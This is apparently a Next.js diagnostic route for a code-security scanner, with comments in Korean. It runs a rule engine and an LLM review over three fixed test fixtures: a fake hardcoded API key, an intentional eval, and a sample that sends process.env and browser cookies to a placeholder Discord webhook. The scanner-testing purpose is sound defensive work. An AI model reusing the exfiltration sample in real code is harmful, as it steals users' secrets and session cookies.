import "server-only";
import { NextResponse } from "next/server";
import { detectFindings, type RawFinding } from "@/lib/detector";
import { reviewAmbiguousFindings } from "@/lib/llmReview";
import { categoryForType, type CategoryId } from "@/lib/findingCategories";
import type { ScannableFile } from "@/lib/scannableFile";

// 검증 전용 진단 라우트. llm-hybrid-scan-activation 브랜치에서만 존재하며
// main에는 절대 병합하지 않는다. DB 읽기/쓰기, 인증 세션 요구가 전혀 없고,
// 아래 3개 고정 fixture만 스캔한다 - 외부 저장소나 사용자 입력을 받지 않는다.
//
// AUTH_SECRET 등 기존 시크릿과 무관하게, 이 파일에만 존재하는 토큰으로
// 접근을 제한한다(쿼리파라미터 ?token=).
const DIAG_TOKEN = "eeaacbb53a1a6feb7d5a7ad4ad0da240";

type Fixture = { name: string; files: ScannableFile[] };

const FIXTURES: Fixture[] = [
  {
    // (a) 확정 시크릿 - needsLlmReview:false 경로. LLM 호출 없이 규칙 엔진
    // 결과가 그대로 나가야 한다.
    name: "hardcoded-secret",
    files: [
      {
        path: "fixture-a.ts",
        content: `const OPENAI_KEY = "sk-FIXTURE00000000000000000000TEST";\nexport function callOpenAi() {\n  return OPENAI_KEY;\n}\n`,
      },
    ],
  },
  {
    // (b) eval()이 있지만 실제로는 파일 내부에 고정된 안전한 표현식만 실행하는
    // 의도된 코드 - LLM이 severity를 낮춰야 하는(오탐 제거) 경로.
    name: "eval-intentional-safe",
    files: [
      {
        path: "fixture-b.ts",
        content:
          "// 이 계산기 매크로의 자체 샌드박스 실행기.\n" +
          "// SAFE_EXPRESSION은 이 파일 안에 고정된 산술 문자열 상수이고 외부 입력을 받지 않는다.\n" +
          'const SAFE_EXPRESSION = "1 + 2 * 3";\n\n' +
          "function runSandboxedMacro(): number {\n" +
          "  return eval(SAFE_EXPRESSION);\n" +
          "}\n",
      },
    ],
  },
  {
    // (c) 수집한 자격 증명/쿠키를 디스코드 웹훅으로 실제 전송하는 코드 - LLM이
    // severity를 유지(또는 상향)해야 하는 경로.
    name: "data-exfiltration-real",
    files: [
      {
        path: "fixture-c.ts",
        content:
          "// 수집된 자격 증명을 디스코드 웹훅으로 전송하는 유출 코드 (고정 fixture).\n" +
          'const WEBHOOK_URL = "https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789ABCDEFGHijk";\n\n' +
          "async function exfiltrateSecrets(): Promise<void> {\n" +
          '  const stolen = { env: process.env, cookies: typeof document !== "undefined" ? document.cookie : "" };\n' +
          '  await fetch(WEBHOOK_URL, { method: "POST", body: JSON.stringify(stolen) });\n' +
          "}\n",
      },
    ],
  },
];

function summarize(findings: RawFinding[]) {
  const categories = Array.from(
    new Set(findings.map((f) => categoryForType(f.type)).filter((c): c is CategoryId => c !== null))
  );
  const severities = Array.from(new Set(findings.map((f) => f.severity)));
  return { count: findings.length, categories, severities };
}

export async function GET(request: Request) {
  // 프로덕션에서는 존재 자체를 드러내지 않는다.
  if (process.env.VERCEL_ENV === "production") {
    return NextResponse.json(null, { status: 404 });
  }

  const url = new URL(request.url);
  if (url.searchParams.get("token") !== DIAG_TOKEN) {
    return NextResponse.json(null, { status: 404 });
  }

  const results = [];
  for (const fixture of FIXTURES) {
    const ruleStart = Date.now();
    const raw = detectFindings(fixture.files);
    const ruleTimeMs = Date.now() - ruleStart;
    const ruleSummary = summarize(raw);
    const hadAmbiguousFindings = raw.some((f) => f.needsLlmReview);

    const usageHolder: { value: { inputTokens: number; outputTokens: number } | null } = {
      value: null,
    };
    const hybridStart = Date.now();
    const hybrid = await reviewAmbiguousFindings(raw, fixture.files, (u) => {
      usageHolder.value = u;
    });
    const usage = usageHolder.value;
    const hybridTimeMs = Date.now() - hybridStart;
    const hybridSummary = summarize(hybrid);

    results.push({
      fixture: fixture.name,
      hadAmbiguousFindings,
      ruleEngineOnly: { ...ruleSummary, timeMs: ruleTimeMs },
      hybrid: {
        ...hybridSummary,
        timeMs: hybridTimeMs,
        llmInvoked: usage !== null,
        inputTokens: usage?.inputTokens ?? null,
        outputTokens: usage?.outputTokens ?? null,
      },
    });
  }

  return NextResponse.json({
    enableLlmHybrid: process.env.ENABLE_LLM_HYBRID === "true",
    hasAnthropicKey: Boolean(process.env.ANTHROPIC_API_KEY),
    results,
  });
}
